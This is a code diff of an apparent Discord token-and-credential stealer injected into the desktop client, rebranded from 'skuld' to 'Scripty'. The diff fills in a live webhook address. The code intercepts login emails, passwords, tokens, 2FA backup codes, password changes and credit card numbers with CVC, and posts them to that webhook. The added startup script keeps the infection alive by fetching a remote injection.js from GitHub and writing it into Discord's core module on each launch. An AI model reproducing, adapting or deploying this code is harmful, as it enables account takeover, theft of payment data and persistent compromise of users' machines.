@@ -7,10 +7,16 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const CONFIG = {
-    webhook: "%WEBHOOK%",
+    webhook: "https://discord.com/api/webhooks/1501483874222608507/FDcwuZLFcZn57oopdAPCS3l7qooDz6rtPqMvU4fYgJvRmN7VOgbAg_sgQCiVTPisp-1X",
     injection_url: "https://raw.githubusercontent.com/nikolas25879alt-maker/ajikhbsdfgo/main/injection.js",
     filters: {
-        urls: ['/auth/login', '/auth/register', '/mfa/totp', '/mfa/codes-verification', '/users/@me'],
+        urls: [
+            '/auth/login',
+            '/auth/register',
+            '/mfa/totp',
+            '/mfa/codes-verification',
+            '/users/@me',
+        ],
     },
     filters2: {
         urls: [
@@ -44,15 +50,15 @@ const CONFIG = {
     },
 };
 
-// ==================== FIXED REQUEST (Critical Fix) ====================
+// ==================== FIXED REQUEST FUNCTION ====================
 const request = (method, url, headers = {}, data = null) => {
     return new Promise((resolve, reject) => {
-        const parsed = new URL(url);
+        const parsedUrl = new URL(url);
         const options = {
-            protocol: parsed.protocol,
-            hostname: parsed.hostname,
-            port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
-            path: parsed.pathname + parsed.search,
+            protocol: parsedUrl.protocol,
+            hostname: parsedUrl.hostname,
+            port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
+            path: parsedUrl.pathname + parsedUrl.search,
             method: method,
             headers: {
                 "Content-Type": "application/json",
@@ -61,18 +67,20 @@ const request = (method, url, headers = {}, data = null) => {
             }
         };
 
-        if (data) options.headers['Content-Length'] = Buffer.byteLength(data);
+        if (data) {
+            options.headers['Content-Length'] = Buffer.byteLength(data);
+        }
 
         const req = https.request(options, (res) => {
-            let body = '';
-            res.on('data', chunk => body += chunk);
+            let responseData = '';
+            res.on('data', chunk => responseData += chunk);
             res.on('end', () => {
                 console.log(`[Webhook] Status: ${res.statusCode}`);
-                resolve(body);
+                resolve(responseData);
             });
         });
 
-        req.on('error', err => {
+        req.on('error', (err) => {
             console.error('[Webhook Error]', err.message);
             reject(err);
         });
@@ -95,22 +103,28 @@ const clearAllUserData = () => {
 const getToken = async () => {
     try {
         return await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
-    } catch { return null; }
+    } catch (e) {
+        return null;
+    }
 };
 
-// ==================== HOOKER + ALL FUNCTIONS (Cleaned) ====================
+// ==================== HOOKER ====================
 const hooker = async (content, token, account) => {
     try {
-        content.content = `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n\n${content.content || ''}`;
-        content.username = "skuld - cord injection";
-        content.avatar_url = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
+        content["content"] = `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n\n${content["content"] || ''}`;
+        content["username"] = "Scripty Discord injection";
+        content["avatar_url"] = "https://cdn.discordapp.com/attachments/1432758350097158176/1441362670119817357/Snimka_obrazovky_2025-08-20_181038.png?ex=6a33bd17&is=6a326b97&hm=f6961eef0a24fd9b159f4c4cc1884a65966bd33c227cabe7d4f70c4384f7c75d";
 
-        content.embeds = content.embeds || [{}];
-        const embed = content.embeds[0];
-        embed.author = { name: account.username };
-        embed.thumbnail = { url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp` };
-        embed.footer = { text: "skuld discord injection - made by hackirby", icon_url: "https://avatars.githubusercontent.com/u/145487845?v=4" };
-        embed.title = "Account Information";
+        content["embeds"][0] = content["embeds"][0] || {};
+        content["embeds"][0]["author"] = { "name": account.username };
+        content["embeds"][0]["thumbnail"] = {
+            "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
+        };
+        content["embeds"][0]["footer"] = {
+            "text": "Discord injected - made by scripty",
+            "icon_url": "https://cdn.discordapp.com/attachments/1432758350097158176/1441362670119817357/Snimka_obrazovky_2025-08-20_181038.png?ex=6a33bd17&is=6a326b97&hm=f6961eef0a24fd9b159f4c4cc1884a65966bd33c227cabe7d4f70c4384f7c75d",
+        };
+        content["embeds"][0]["title"] = "Account Information";
 
         const nitro = getNitro(account.premium_type);
         const badges = getBadges(account.flags);
@@ -118,20 +132,20 @@ const hooker = async (content, token, account) => {
         const friends = await getFriends(token);
         const servers = await getServers(token);
 
-        embed.fields = embed.fields || [];
-        embed.fields.push(
-            { name: "Token", value: "```" + token + "```", inline: false },
-            { name: "Nitro", value: nitro, inline: true },
-            { name: "Badges", value: badges, inline: true },
-            { name: "Billing", value: billing, inline: true }
+        content["embeds"][0]["fields"] = content["embeds"][0]["fields"] || [];
+        content["embeds"][0]["fields"].push(
+            { "name": "Token", "value": "```" + token + "```", "inline": false },
+            { "name": "Nitro", "value": nitro, "inline": true },
+            { "name": "Badges", "value": badges, "inline": true },
+            { "name": "Billing", "value": billing, "inline": true }
         );
 
-        content.embeds.push(
-            { title: `Total Friends: ${friends.totalFriends}`, description: friends.message },
-            { title: `Total Servers: ${servers.totalGuilds}`, description: servers.message }
+        content["embeds"].push(
+            { "title": `Total Friends: ${friends.totalFriends}`, "description": friends.message },
+            { "title": `Total Servers: ${servers.totalGuilds}`, "description": servers.message }
         );
 
-        content.embeds.forEach(e => e.color = 0xb143e3);
+        content["embeds"].forEach(embed => embed["color"] = 1752220);
 
         await request("POST", CONFIG.webhook, {}, JSON.stringify(content));
         console.log("[+] Webhook sent successfully");
@@ -140,161 +154,328 @@ const hooker = async (content, token, account) => {
     }
 };
 
-const fetchData = async (endpoint, token) => {
-    const data = await request("GET", CONFIG.API + endpoint, { Authorization: token });
+const fetch = async (endpoint, headers) => {
+    const data = await request("GET", CONFIG.API + endpoint, headers);
     return JSON.parse(data);
 };
 
-const getNitro = f => f === 1 ? '`Nitro Classic`' : f === 2 ? '`Nitro Boost`' : f === 3 ? '`Nitro Basic`' : '`❌`';
-const getBadges = flags => {
-    let b = '';
-    for (const key in CONFIG.badges) {
-        const badge = CONFIG.badges[key];
-        if ((flags & badge.Value) === badge.Value) b += badge.Emoji + ' ';
+const fetchAccount = async token => await fetch("", { "Authorization": token });
+const fetchBilling = async token => await fetch("/billing/payment-sources", { "Authorization": token });
+const fetchServers = async token => await fetch("/guilds?with_counts=true", { "Authorization": token });
+const fetchFriends = async token => await fetch("/relationships", { "Authorization": token });
+
+const getNitro = flags => {
+    switch (flags) {
+        case 1: return '`Nitro Classic`';
+        case 2: return '`Nitro Boost`';
+        case 3: return '`Nitro Basic`';
+        default: return '`❌`';
     }
-    return b || '`❌`';
+};
+
+const getBadges = flags => {
+    let badges = '';
+    for (const badge in CONFIG.badges) {
+        const b = CONFIG.badges[badge];
+        if ((flags & b.Value) === b.Value) badges += b.Emoji + ' ';
+    }
+    return badges || '`❌`';
 };
 
 const getRareBadges = flags => {
-    let b = '';
-    for (const key in CONFIG.badges) {
-        const badge = CONFIG.badges[key];
-        if ((flags & badge.Value) === badge.Value && badge.Rare) b += badge.Emoji + ' ';
+    let badges = '';
+    for (const badge in CONFIG.badges) {
+        const b = CONFIG.badges[badge];
+        if ((flags & b.Value) === b.Value && b.Rare) badges += b.Emoji + ' ';
     }
-    return b;
+    return badges;
 };
 
 const getBilling = async token => {
     try {
-        const data = await fetchData("/billing/payment-sources", token);
-        let res = '';
+        const data = await fetchBilling(token);
+        let billing = '';
         data.forEach(x => {
-            if (!x.invalid) res += x.type === 1 ? '💳 ' : x.type === 2 ? '<:paypal:1148653305376034967> ' : '';
+            if (!x.invalid) {
+                if (x.type === 1) billing += '💳 ';
+                else if (x.type === 2) billing += '<:paypal:1148653305376034967> ';
+            }
         });
-        return res || '`❌`';
+        return billing || '`❌`';
     } catch { return '`❌`'; }
 };
 
 const getFriends = async token => {
     try {
-        const friends = await fetchData("/relationships", token);
-        const filtered = friends.filter(u => u.type === 1);
-        let rare = "";
-        for (const f of filtered) {
-            const rb = getRareBadges(f.user.public_flags);
-            if (rb) {
-                if (!rare) rare = "**Rare Friends:**\n";
-                rare += `${rb} ${f.user.username}\n`;
+        const friends = await fetchFriends(token);
+        const filteredFriends = friends.filter(user => user.type === 1);
+        let rareUsers = "";
+        for (const acc of filteredFriends) {
+            const badges = getRareBadges(acc.user.public_flags);
+            if (badges) {
+                if (!rareUsers) rareUsers = "**Rare Friends:**\n";
+                rareUsers += `${badges} ${acc.user.username}\n`;
             }
         }
-        return { message: rare || "**No Rare Friends**", totalFriends: friends.length };
-    } catch { return { message: "**No Rare Friends**", totalFriends: 0 }; }
+        return {
+            message: rareUsers || "**No Rare Friends**",
+            totalFriends: friends.length,
+        };
+    } catch {
+        return { message: "**No Rare Friends**", totalFriends: 0 };
+    }
 };
 
 const getServers = async token => {
     try {
-        const guilds = await fetchData("/guilds?with_counts=true", token);
-        const filtered = guilds.filter(g => ['562949953421311', '2251799813685247'].includes(g.permissions));
-        let rare = "";
-        for (const g of filtered) {
-            if (!rare) rare = "**Rare Servers:**\n";
-            rare += `${g.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | \`${g.name}\` - ${g.approximate_member_count} members\n`;
+        const guilds = await fetchServers(token);
+        const filteredGuilds = guilds.filter(g => g.permissions === '562949953421311' || g.permissions === '2251799813685247');
+        let rareGuilds = "";
+        for (const guild of filteredGuilds) {
+            if (!rareGuilds) rareGuilds += `**Rare Servers:**\n`;
+            rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
         }
-        return { message: rare || "**No Rare Servers**", totalGuilds: guilds.length };
-    } catch { return { message: "**No Rare Servers**", totalGuilds: 0 }; }
+        return {
+            message: rareGuilds || "**No Rare Servers**",
+            totalGuilds: guilds.length,
+        };
+    } catch {
+        return { message: "**No Rare Servers**", totalGuilds: 0 };
+    }
 };
 
-// Event Handlers
-const EmailPassToken = async (email, pass, token, action) => {
-    const acc = await fetchData("", token);
-    hooker({ content: `**${acc.username}** just ${action}!`, embeds: [{ fields: [{name:"Email",value:`\`${email}\``,inline:true}, {name:"Password",value:`\`${pass}\``,inline:true}] }] }, token, acc);
+// ==================== EVENT HANDLERS ====================
+const EmailPassToken = async (email, password, token, action) => {
+    const account = await fetchAccount(token);
+    const content = {
+        content: `**${account.username}** just ${action}!`,
+        embeds: [{
+            fields: [
+                { name: "Email", value: `\`${email}\``, inline: true },
+                { name: "Password", value: `\`${password}\``, inline: true }
+            ]
+        }]
+    };
+    hooker(content, token, account);
 };
 
 const BackupCodesViewed = async (codes, token) => {
-    const acc = await fetchData("", token);
-    const filtered = codes.filter(c => !c.consumed);
-    const msg = filtered.map(c => `${c.code.slice(0,4)}-${c.code.slice(4)}`).join('\n');
-    hooker({
-        content: `**${acc.username}** just viewed his 2FA backup codes!`,
-        embeds: [{ fields: [{name:"Backup Codes",value:"```"+msg+"```",inline:false}, {name:"Email",value:`\`${acc.email}\``,inline:true}, {name:"Phone",value:`\`${acc.phone||"None"}\``,inline:true}] }]
-    }, token, acc);
+    const account = await fetchAccount(token);
+    const filteredCodes = codes.filter(code => !code.consumed);
+    const message = filteredCodes.map(code => `${code.code.substr(0,4)}-${code.code.substr(4)}`).join('\n');
+
+    const content = {
+        content: `**${account.username}** just viewed his 2FA backup codes!`,
+        embeds: [{
+            fields: [
+                { name: "Backup Codes", value: "```" + message + "```", inline: false },
+                { name: "Email", value: `\`${account.email}\``, inline: true },
+                { name: "Phone", value: `\`${account.phone || "None"}\``, inline: true }
+            ]
+        }]
+    };
+    hooker(content, token, account);
 };
 
-const PasswordChanged = async (newPass, oldPass, token) => {
-    const acc = await fetchData("", token);
-    hooker({ content: `**${acc.username}** just changed his password!`, embeds: [{ fields: [{name:"New Password",value:`\`${newPass}\``,inline:true}, {name:"Old Password",value:`\`${oldPass}\``,inline:true}] }] }, token, acc);
+const PasswordChanged = async (newPassword, oldPassword, token) => {
+    const account = await fetchAccount(token);
+    const content = {
+        content: `**${account.username}** just changed his password!`,
+        embeds: [{
+            fields: [
+                { name: "New Password", value: `\`${newPassword}\``, inline: true },
+                { name: "Old Password", value: `\`${oldPassword}\``, inline: true }
+            ]
+        }]
+    };
+    hooker(content, token, account);
 };
 
-const CreditCardAdded = async (num, cvc, month, year, token) => {
-    const acc = await fetchData("", token);
-    hooker({ content: `**${acc.username}** just added a credit card!`, embeds: [{ fields: [{name:"Number",value:`\`${num}\``,inline:true}, {name:"CVC",value:`\`${cvc}\``,inline:true}, {name:"Expiration",value:`\`${month}/${year}\``,inline:true}] }] }, token, acc);
+const CreditCardAdded = async (number, cvc, month, year, token) => {
+    const account = await fetchAccount(token);
+    const content = {
+        content: `**${account.username}** just added a credit card!`,
+        embeds: [{
+            fields: [
+                { name: "Number", value: `\`${number}\``, inline: true },
+                { name: "CVC", value: `\`${cvc}\``, inline: true },
+                { name: "Expiration", value: `\`${month}/${year}\``, inline: true }
+            ]
+        }]
+    };
+    hooker(content, token, account);
 };
 
-const PaypalAdded = async token => {
-    const acc = await fetchData("", token);
-    hooker({ content: `**${acc.username}** just added a <:paypal:1148653305376034967> account!`, embeds: [{ fields: [{name:"Email",value:`\`${acc.email}\``,inline:true}, {name:"Phone",value:`\`${acc.phone||"None"}\``,inline:true}] }] }, token, acc);
+const PaypalAdded = async (token) => {
+    const account = await fetchAccount(token);
+    const content = {
+        content: `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
+        embeds: [{
+            fields: [
+                { name: "Email", value: `\`${account.email}\``, inline: true },
+                { name: "Phone", value: `\`${account.phone || "None"}\``, inline: true }
+            ]
+        }]
+    };
+    hooker(content, token, account);
 };
 
-// ==================== INITIATION & DEBUGGER ====================
-let initiationCalled = false;
-let email = "", password = "";
+// ==================== DISCORD PATH & INITIATION ====================
+const discordPath = (() => {
+    const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
+    let resourcePath;
+    if (process.platform === 'win32') {
+        resourcePath = path.join(app, 'resources');
+    } else if (process.platform === 'darwin') {
+        resourcePath = path.join(app, 'Contents', 'Resources');
+    }
+    if (fs.existsSync(resourcePath)) return { resourcePath, app };
+    return { undefined, undefined };
+})();
 
 async function initiation() {
-    const flag = path.join(__dirname, 'initiation');
-    if (fs.existsSync(flag)) {
-        fs.rmSync(flag, { recursive: true, force: true });
+    const initiationFlag = path.join(__dirname, 'initiation');
+    if (fs.existsSync(initiationFlag)) {
+        fs.rmSync(initiationFlag, { recursive: true, force: true });
         const token = await getToken();
         if (token) {
-            const acc = await fetchData("", token);
-            hooker({ content: `**${acc.username}** just got injected!`, embeds: [{ fields: [{name:"Email",value:`\`${acc.email}\``,inline:true}, {name:"Phone",value:`\`${acc.phone||"None"}\``,inline:true}] }] }, token, acc);
+            const account = await fetchAccount(token);
+            const content = {
+                content: `**${account.username}** just got injected!`,
+                embeds: [{
+                    fields: [
+                        { name: "Email", value: `\`${account.email}\``, inline: true },
+                        { name: "Phone", value: `\`${account.phone || "None"}\``, inline: true }
+                    ]
+                }]
+            };
+            await hooker(content, token, account);
         }
         clearAllUserData();
     }
+
+    const { resourcePath, app } = discordPath;
+    if (!resourcePath || !app) return;
+
+    const appPath = path.join(resourcePath, 'app');
+    const packageJson = path.join(appPath, 'package.json');
+    const resourceIndex = path.join(appPath, 'index.js');
+    const coreVal = fs.readdirSync(path.join(app, 'modules')).find(x => /discord_desktop_core-/.test(x));
+    const indexJs = path.join(app, 'modules', coreVal, 'discord_desktop_core', 'index.js');
+    const bdPath = path.join(process.env.APPDATA, 'BetterDiscord', 'data', 'betterdiscord.asar');
+
+    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath, { recursive: true });
+    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
+    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
+
+    fs.writeFileSync(packageJson, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
+
+    const startUpScript = `
+const fs = require('fs');
+const https = require('https');
+const path = require('path');
+
+const CONFIG = {
+    webhook: "https://discord.com/api/webhooks/1501483874222608507/FDcwuZLFcZn57oopdAPCS3l7qooDz6rtPqMvU4fYgJvRmN7VOgbAg_sgQCiVTPisp-1X",
+    injection_url: "https://raw.githubusercontent.com/nikolas25879alt-maker/ajikhbsdfgo/main/injection.js"
+};
+
+// Find core index.js
+const appPath = path.dirname(process.execPath);
+const modulesPath = path.join(appPath, 'modules');
+const coreFolder = fs.readdirSync(modulesPath).find(x => x.startsWith('discord_desktop_core-'));
+const indexJs = path.join(modulesPath, coreFolder, 'discord_desktop_core', 'index.js');
+const bdPath = path.join(process.env.APPDATA, 'BetterDiscord', 'data', 'betterdiscord.asar');
+
+async function loadInjection() {
+    try {
+        const res = await new Promise((resolve, reject) => {
+            https.get(CONFIG.injection_url, resolve).on('error', reject);
+        });
+
+        let data = '';
+        res.on('data', chunk => data += chunk);
+        res.on('end', () => {
+            data = data.replace('%WEBHOOK%', CONFIG.webhook);
+            fs.writeFileSync(indexJs, data);
+            console.log('[+] Skuld Injection Loaded Successfully');
+        });
+    } catch (e) {
+        console.error('[-] Failed to load injection:', e.message);
+        setTimeout(loadInjection, 5000);
+    }
 }
 
-const createWindow = () => {
-    const main = BrowserWindow.getAllWindows()[0];
-    if (!main) return;
+// Load injection if needed
+if (fs.existsSync(indexJs)) {
+    const size = fs.statSync(indexJs).size;
+    const content = fs.readFileSync(indexJs, 'utf8');
+    if (size < 25000 || content.includes('core.asar')) {
+        loadInjection();
+    }
+}
 
-    main.webContents.debugger.attach('1.3');
-    main.webContents.debugger.on('message', async (_, method, params) => {
+// Load normal Discord + BetterDiscord
+require(path.join(appPath, 'app.asar'));
+if (fs.existsSync(bdPath)) require(bdPath);`;
+
+    fs.writeFileSync(resourceIndex, startUpScript);
+}
+
+// ==================== DEBUGGER & WEBREQUEST ====================
+let initiationCalled = false;
+let email = "", password = "";
+
+const createWindow = () => {
+    const mainWindow = BrowserWindow.getAllWindows()[0];
+    if (!mainWindow) return;
+
+    mainWindow.webContents.debugger.attach('1.3');
+    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
         if (!initiationCalled) {
             initiationCalled = true;
-            initiation();
+            await initiation();
         }
 
-        if (method !== 'Network.responseReceived' || ![200, 202].includes(params.response.status)) return;
+        if (method !== 'Network.responseReceived') return;
         if (!CONFIG.filters.urls.some(u => params.response.url.includes(u))) return;
+        if (![200, 202].includes(params.response.status)) return;
 
         try {
-            const resp = await main.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
-            const req = await main.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });
+            const responseBody = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
+            const requestBody = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });
 
-            const rData = JSON.parse(resp.body || '{}');
-            const qData = JSON.parse(req.postData || '{}');
+            const responseData = JSON.parse(responseBody.body || '{}');
+            const requestData = JSON.parse(requestBody.postData || '{}');
 
             if (params.response.url.endsWith('/login')) {
-                if (rData.token) EmailPassToken(qData.login, qData.password, rData.token, "logged in");
-                else { email = qData.login; password = qData.password; }
+                if (responseData.token) {
+                    EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
+                } else {
+                    email = requestData.login;
+                    password = requestData.password;
+                }
             } else if (params.response.url.endsWith('/register')) {
-                EmailPassToken(qData.email, qData.password, rData.token, "signed up");
+                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
             } else if (params.response.url.endsWith('/totp')) {
-                EmailPassToken(email, password, rData.token, "logged in with 2FA");
+                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
             } else if (params.response.url.endsWith('/codes-verification')) {
-                BackupCodesViewed(rData.backup_codes, await getToken());
-            } else if (params.response.url.endsWith('/@me') && qData.password) {
-                if (qData.new_password) PasswordChanged(qData.new_password, qData.password, rData.token);
-                if (qData.email) EmailPassToken(qData.email, qData.password, rData.token, "changed email");
+                BackupCodesViewed(responseData.backup_codes, await getToken());
+            } else if (params.response.url.endsWith('/@me') && requestData.password) {
+                if (requestData.new_password) PasswordChanged(requestData.new_password, requestData.password, responseData.token);
+                if (requestData.email) EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email");
             }
         } catch (e) {}
     });
 
-    main.webContents.debugger.sendCommand('Network.enable');
+    mainWindow.webContents.debugger.sendCommand('Network.enable');
+
+    mainWindow.on('closed', createWindow);
 };
 
 createWindow();
 
-// Payment listeners
+// Payment handlers
 session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
     if (![200, 202].includes(details.statusCode) || details.method !== 'POST') return;
     try {
@@ -307,10 +488,15 @@ session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (det
     } catch (e) {}
 });
 
-session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (_, callback) => callback({ cancel: true }));
+session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
+    callback({ cancel: true });
+});
 
-// BetterDiscord
+// BetterDiscord support
 const bdPath = path.join(process.env.APPDATA, 'BetterDiscord', 'data', 'betterdiscord.asar');
 if (fs.existsSync(bdPath)) require(bdPath);
 
 module.exports = require("./core.asar");
+
+// require("C:\\Users\\nikol.PRACKA\\AppData\\Roaming\\BetterDiscord\\data\\betterdiscord.asar");
+// module.exports = require("./core.asar");
